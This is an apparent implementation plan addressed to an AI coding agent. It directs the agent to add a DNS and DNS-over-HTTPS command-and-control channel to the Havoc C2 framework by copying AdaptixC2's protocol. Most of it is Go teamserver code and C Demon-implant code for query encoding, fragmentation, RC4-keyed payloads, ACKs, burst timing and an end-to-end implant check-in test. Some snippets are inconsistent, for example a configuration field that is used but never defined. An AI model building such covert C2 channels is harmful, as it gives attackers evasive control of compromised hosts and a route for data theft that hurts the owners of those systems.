# Implementation Plan: DNS C2 Channel for Havoc (AdaptixC2 Parity)

**Original Repo:** https://github.com/Adaptix-Framework/AdaptixC2

**Target framework:** Havoc (Teamserver in Go, Demon agent in C)  
**Reference implementation:** AdaptixC2 DNS/DoH listener (`beacon_listener_dns`) and `ConnectorDNS` agent module.  
**Goal:** Add a DNS C2 channel to Havoc that replicates AdaptixC2's encoding, fragmentation, ACK logic, and DoH fallback.

**Rules for the implementing agent:**
- Do **not** invent new protocol fields. Use only the structures and byte layouts shown in the snippets below.
- Copy the logic from the reference snippets and adapt identifiers to Havoc's existing types.
- Every task below is finite. Complete tasks in order. Do not skip ahead.
- When a Havoc file path is referenced, open it and follow the existing patterns.

---

## 0. Prerequisites & File Map

| File | Action |
| :--- | :--- |
| `teamserver/pkg/handlers/dns.go` | **Create** – server-side DNS handler |
| `teamserver/pkg/service/listener.go` | **Modify** – register the DNS listener |
| `payloads/Demon/src/core/Transport.c` | **Modify** – add `TRANSPORT_DNS` branch |
| `payloads/Demon/src/core/ConnectorDNS.c` | **Create** – agent-side DNS logic |
| `payloads/Demon/include/ConnectorDNS.h` | **Create** – declarations |

**Reference material to consult side-by-side while coding:**
- AdaptixC2 `pl_transport.go` (server transport)
- AdaptixC2 `pl_main.go` (listener plugin interface)
- AdaptixC2 `ConnectorDNS.cpp` (agent connector)
- Havoc `handlers/http.go` (listener pattern)
- Havoc `Transport.c` (agent transport pattern)

---

## Task 1 – Add DNS listener configuration to Havoc Teamserver

### 1.1 Define the DNS transport config struct

Create `teamserver/pkg/handlers/dns.go` and add the following struct **exactly** as shown (adapted from AdaptixC2 `TransportConfig`):

```go
type DNSConfig struct {
    HostBind     string `json:"host_bind"`
    PortBind     int    `json:"port_bind"`
    Domain       string `json:"domain"`
    PktSize      int    `json:"pkt_size"`
    TTL          int    `json:"ttl"`
    EncryptKey   string `json:"encrypt_key"`
    BurstEnabled bool   `json:"burst_enabled"`
    BurstSleep   int    `json:"burst_sleep"`
    BurstJitter  int    `json:"burst_jitter"`
}
```

**Reference:** AdaptixC2 `TransportConfig` has these exact fields.

### 1.2 Register the listener type

In `teamserver/pkg/service/listener.go`, locate the switch that handles listener types (e.g., `"HTTP"`, `"SMB"`). Add a case for `"DNS"` that instantiates the new DNS handler.  
**Do not** change the existing HTTP/SMB cases. Follow the same pattern used in `handlers/http.go` for `NewConfigHttp()`.

---

## Task 2 – Implement the server-side DNS transport (Go)

### 2.1 Create the `TransportDNS` struct

In `teamserver/pkg/handlers/dns.go`, define:

```go
type TransportDNS struct {
    Config      DNSConfig
    udpServer   *dns.Server
    tcpServer   *dns.Server
    mu          sync.Mutex
    upFrags     map[string]*dnsFragBuf
    downFrags   map[string]*dnsDownBuf
    upDoneCache map[string]*dnsUpDone
    rng         *mrand.Rand
}
```

**Reference:** AdaptixC2 `TransportDNS` fields.  
Use the `github.com/miekg/dns` package for DNS packet handling.

### 2.2 Start UDP and TCP servers

Implement a `Start` method that binds both UDP and TCP on `HostBind:PortBind` and registers the handler:

```go
func (t *TransportDNS) Start() error {
    addr := net.JoinHostPort(t.Config.HostBind, strconv.Itoa(t.Config.PortBind))
    mux := dns.NewServeMux()
    mux.HandleFunc(".", t.handleDNS)
    t.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
    t.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
    go t.udpServer.ListenAndServe()
    go t.tcpServer.ListenAndServe()
    return nil
}
```

**Reference:** AdaptixC2 `Start` method.

---

## Task 3 – DNS protocol parsing and encoding

### 3.1 QNAME structure

Every DNS query must follow this exact label order:

```text
{SID}.{OP}.{SEQ}.{IDX}.{DATA_LABELS}.{DOMAIN}
```

| Segment | Source | Purpose |
| :--- | :--- | :--- |
| `SID` | 8-char hex | Agent session ID |
| `OP` | `www`/`hi`, `cdn`/`put`, `api`/`get`, `hb` | Operation |
| `SEQ` | hex, XORed with a mask | Sequence number |
| `IDX` | reserved | Fragment index (may be empty) |
| `DATA_LABELS` | Base32 (no padding) | Encoded payload |

**Reference:** AdaptixC2 QNAME parsing.

### 3.2 Parse the QNAME in Go

Implement `parseRequest(q dns.Question) *dnsRequest`:

```go
func (t *TransportDNS) parseRequest(q dns.Question) *dnsRequest {
    labels := dns.SplitDomainName(q.Name)
    base := labels
    // strip configured domain suffix (same as AdaptixC2)
    if len(t.Config.Domains) > 0 {
        for i := range labels {
            tail := strings.ToLower(strings.Join(labels[i:], "."))
            for _, dom := range t.Config.Domains {
                if tail == dom {
                    base = labels[:i]
                    break
                }
            }
        }
    }
    req := new(dnsRequest)
    req.qtype = q.Qtype
    req.qname = q.Name
    if len(base) < 5 { return req }
    req.sid = strings.ToLower(base[0])
    rawOp := strings.ToLower(base[1])
    switch rawOp {
    case "www", "hi":  req.op = "HI"
    case "cdn", "put": req.op = "PUT"
    case "api", "get": req.op = "GET"
    case "hb":         req.op = "HB"
    }
    if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
        req.seq = int(v ^ seqXorMask)
    }
    dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
    enc := base32.StdEncoding.WithPadding(base32.NoPadding)
    if db, err := enc.DecodeString(dataLabel); err == nil {
        req.data = db
    }
    return req
}
```

**Reference:** Copy the logic from AdaptixC2 `parseRequest`.  
`seqXorMask` is a constant used in AdaptixC2; define it as `0x5A5A5A5A` (or keep the same value if already present in Havoc).

### 3.3 Base32 encoding for agent-side queries

On the agent (C), use the same Base32 alphabet without padding. AdaptixC2 calls `DnsCodec::EncodeName` before building the wire query.  
Implement `Base32Encode(const BYTE* data, ULONG len, CHAR* out)` using the standard RFC 4648 alphabet `ABCDEFGHIJKLMNOPQRSTUVWXYZ234567`, stripping `=` padding.

---

## Task 4 – Fragment reassembly and ACK logic

### 4.1 Upload (PUT) handling

Implement `handlePUT(req *dnsRequest) putAckInfo` with the same byte layout as AdaptixC2:

- Payload after RC4 decryption:
  - `[0:4]` total length (big-endian `uint32`)
  - `[4:8]` offset (big-endian `uint32`)
  - `[8:]` chunk data
- ACK response for `A` record:
  - `ip[0]` = flags (`0x01` complete, `0x02` needs reset)
  - `ip[1:4]` = `nextExpectedOff` as 24-bit big-endian

```go
func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
    switch req.qtype {
    case dns.TypeA:
        ip := make(net.IP, 4)
        var flags byte
        if ack.complete      { flags |= 0x01 }
        if ack.needsReset    { flags |= 0x02 }
        ip[0] = flags
        ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
        ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
        ip[3] = byte(ack.nextExpectedOff & 0xFF)
        return &dns.A{ Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: ip }
    }
}
```

**Reference:** AdaptixC2 ACK encoding for `A` records.  
Use the same fragment buffer fields (`total`, `filled`, `nextExpectedOff`, `seenOffsets`) as in `handlePUT`.

### 4.2 Download (GET) handling

`handleGET` must:
1. Decrypt the request with RC4 to read `reqOffset`.
2. Look up `downFrags[sid]`.
3. If no buffer exists, fetch tasks via `TsAgentGetHostedAll`.
4. Return a response frame:
   - `[0:4]` total length
   - `[4:8]` offset
   - `[8:]` chunk

```go
func (t *TransportDNS) buildResponseChunk(df *dnsDownBuf, reqOffset uint32, isTCP bool) []byte {
    if df == nil || df.total == 0 { return nil }
    if reqOffset >= df.total { reqOffset = 0 }
    maxChunk := t.Config.PktSize
    if !isTCP && maxChunk > dnsSafeChunkSize { maxChunk = dnsSafeChunkSize }
    remaining := df.total - reqOffset
    chunkLen := remaining
    if chunkLen > uint32(maxChunk) { chunkLen = uint32(maxChunk) }
    frame := make([]byte, 8+chunkLen)
    binary.BigEndian.PutUint32(frame[0:4], df.total)
    binary.BigEndian.PutUint32(frame[4:8], reqOffset)
    copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
    return frame
}
```

**Reference:** AdaptixC2 `buildResponseChunk` and `handleGET`.

---

## Task 5 – Integrate with Havoc agent registration and tasking

The DNS listener must call the same Teamserver interface methods that the HTTP listener uses. AdaptixC2 defines a `Teamserver` interface with:

```go
type Teamserver interface {
    TsAgentIsExists(agentId string) bool
    TsAgentCreate(agentCrc string, agentId string, beat []byte, listenerName string, ExternalIP string, Async bool) (adaptix.AgentData, error)
    TsAgentProcessData(agentId string, bodyData []byte) error
    TsAgentSetTick(agentId string, listenerName string) error
    TsAgentGetHostedAll(agentId string, maxDataSize int) ([]byte, error)
}
```

**Reference:** AdaptixC2 `pl_main.go` interface.

In Havoc, locate the equivalent Teamserver methods (search for `TsAgentCreate`, `TsAgentProcessData` in the Havoc codebase). Replace the Adaptix-specific `adaptix.AgentData` return type with Havoc's agent data type. **Do not change the method names**—use the existing Havoc methods.

In `handleHI`, extract `agentType` and `agentId` from the first 8 bytes of the decrypted payload after RC4, then call `TsAgentCreate` and `TsAgentSetTick`.

---

## Task 6 – Implement the agent-side DNS connector in Demon (C)

### 6.1 Add a new transport branch

In `payloads/Demon/src/core/Transport.c`, add:

```c
#ifdef TRANSPORT_DNS
    // DNS-specific initialization and send/receive
#endif
```

Follow the existing `TRANSPORT_HTTP` and `TRANSPORT_SMB` structure.

### 6.2 Build the DNS wire query

Implement `BuildDnsWireQuery` in `ConnectorDNS.c` using the exact header layout:

```c
BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr,
                                     BYTE* outBuf, ULONG outBufSize, ULONG* outLen) {
    if (!outBuf || outBufSize < 512 || !outLen) return FALSE;
    *outLen = 0;
    memset(outBuf, 0, outBufSize);
    USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
    outBuf[0] = (BYTE)(id >> 8);
    outBuf[1] = (BYTE)(id & 0xFF);
    outBuf[2] = 0x01;   // RD flag
    outBuf[3] = 0x00;
    outBuf[4] = 0x00;
    outBuf[5] = 0x01;   // QDCOUNT = 1
    ULONG offset = 12;
    int nameLen = DnsCodec::EncodeName(qname, outBuf + offset, outBufSize - offset - 4);
    if (nameLen < 0) return FALSE;
    offset += nameLen;
    USHORT qtypeCode = ParseQtypeCode(qtypeStr);
    outBuf[offset++] = (BYTE)(qtypeCode >> 8);
    outBuf[offset++] = (BYTE)(qtypeCode & 0xFF);
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x01; // IN class
    *outLen = offset;
    return TRUE;
}
```

**Reference:** AdaptixC2 `BuildDnsWireQuery`.

### 6.3 Parse the DNS wire response

Implement `ParseDnsWireResponse` exactly as in AdaptixC2:

- Skip questions.
- Iterate answers.
- For `TXT` (`qtypeCode == 16`), concatenate TXT strings.
- For `A` (`qtypeCode == 1`), copy 4 bytes.
- For `AAAA` (`qtypeCode == 28`), copy 16 bytes.

**Reference:** AdaptixC2 `ParseDnsWireResponse`.

### 6.4 Send a single UDP DNS query

Implement `QuerySingle` using `sendto` / `recvfrom` on port 53, with a timeout via `select`. Use the cached socket pattern from AdaptixC2.

### 6.5 Parse the PUT ACK

Implement `ParsePutAckResponse`:

```c
BOOL ConnectorDNS::ParsePutAckResponse(BYTE* response, ULONG respLen,
                                       ULONG* outNextExpected,
                                       BOOL* outComplete, BOOL* outNeedsReset) {
    if (!response || respLen < 4) return FALSE;
    BYTE flags = response[0];
    ULONG nextExpected = ((ULONG)response[1] << 16) |
                         ((ULONG)response[2] << 8)  |
                          (ULONG)response[3];
    if (outComplete)    *outComplete    = (flags & 0x01) ? TRUE : FALSE;
    if (outNeedsReset)  *outNeedsReset  = (flags & 0x02) ? TRUE : FALSE;
    if (outNextExpected) *outNextExpected = nextExpected;
    return TRUE;
}
```

**Reference:** AdaptixC2 `ParsePutAckResponse`.

---

## Task 7 – DoH fallback and burst mode

### 7.1 DoH fallback

Havoc's agent must try DoH when plain DNS fails. AdaptixC2's DoH logic uses `wininet.dll` (`InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`) to POST a wire-format DNS query to `/dns-query`.  
Implement `QueryDoH` following the pattern in AdaptixC2.  
On failure, rotate to the next resolver using the same backoff logic as `QueryDoHWithRotation`.

### 7.2 Burst mode

When `BurstEnabled` is true, the agent must ignore the normal sleep interval and send multiple queries in rapid succession, incrementing the sequence number each time.  
Use the same burst configuration fields (`BurstSleep`, `BurstJitter`) from `DNSConfig`.  
No additional protocol changes are needed—burst mode only changes timing.

---

## Task 8 – Testing and validation

1. **Unit test QNAME parsing:** Build a query with labels `deadbeef.www.0001.idx.MZXW6YTB.example.com` and confirm `parseRequest` returns `sid = "deadbeef"`, `op = "HI"`, and the decoded Base32 data matches.
2. **Test PUT ACK byte layout:** Send a `PUT` query with a fragmented payload and verify the `A` record response encodes `nextExpectedOff` correctly.
3. **Test DoH fallback:** Configure a resolver list with one invalid and one valid DoH URL. Confirm the agent rotates to the valid resolver after the failure threshold.
4. **End-to-end:** Start the Havoc teamserver with a DNS listener, generate a Demon with `TRANSPORT_DNS`, and confirm check-in, tasking, and large file transfer (fragmented) work over UDP DNS.

---

## Appendix – Key constants and helpers

| Constant | Value / Source |
| :--- | :--- |
| `dnsSafeChunkSize` | 220 bytes (safe for UDP) – AdaptixC2 uses a similar cap |
| `seqXorMask` | `0x5A5A5A5A` (keep consistent between server and agent) |
| RC4 key | 16 bytes, from `EncryptKey` config (AdaptixC2 requires 16-byte key) |
| Base32 alphabet | `ABCDEFGHIJKLMNOPQRSTUVWXYZ234567` (no padding) |
| PUT ACK flags | `0x01` = complete, `0x02` = needs reset |

**Final instruction:** Do not redesign the protocol. Copy the byte layouts, label order, and ACK formats exactly as shown. If a Havoc type differs from the AdaptixC2 type (e.g., agent data struct), adapt only the type name—never the wire format.
